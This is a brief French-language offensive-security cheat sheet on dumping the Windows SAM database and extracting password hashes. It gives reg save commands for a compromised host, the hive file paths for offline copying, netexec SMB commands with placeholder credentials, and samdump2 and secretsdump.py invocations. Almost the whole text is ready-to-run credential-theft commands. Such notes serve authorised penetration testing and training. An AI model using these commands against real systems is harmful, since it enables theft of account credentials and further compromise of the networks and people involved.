# Base SAM

### Récupérer la base SAM

#### Depuis un compte "administrateur local" sur le poste compromis

En PowerShell sur une machine compromise, il faut exécuter les commandes suivantes :

```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

#### Depuis la partition Windows montée sur une clé bootable

Copier les fichiers SAM, SECURITY et SYSTEM sur un média amovibles.

```
# Chemin des fichiers
Windows/System32/config/SAM
Windows/System32/config/SECURITY
Windows/System32/config/SYSTEM
```

#### Depuis le réseau

```
# Avec un compte "admin" local

nxc smb <IP> -u <USER> -p <PASS> --sam
nxc smb <IP> --use-kcache --sam
```

### Extraire les _hashs_

```
samdump2 system sam
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL # Fonctionne pour W10 et W11
```
